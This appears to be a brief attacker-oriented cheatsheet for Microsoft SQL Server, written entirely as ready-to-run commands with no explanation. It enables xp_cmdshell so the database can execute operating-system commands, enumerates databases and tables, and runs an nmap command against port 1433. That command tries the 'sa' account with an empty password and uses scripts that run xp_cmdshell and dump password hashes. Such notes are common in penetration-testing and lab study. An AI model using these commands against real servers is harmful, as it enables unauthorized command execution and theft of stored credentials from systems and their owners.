# Cheatsheet

## Enable xp_cmdshell

```
exec sp_configure 'show advanced options', 1
reconfigure
exec sp_configure 'xp_cmdshell', 1
reconfigure
```

```
EXEC sp_databases;
select * from sysobjects where xtype = 'U';
```

```
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip
```
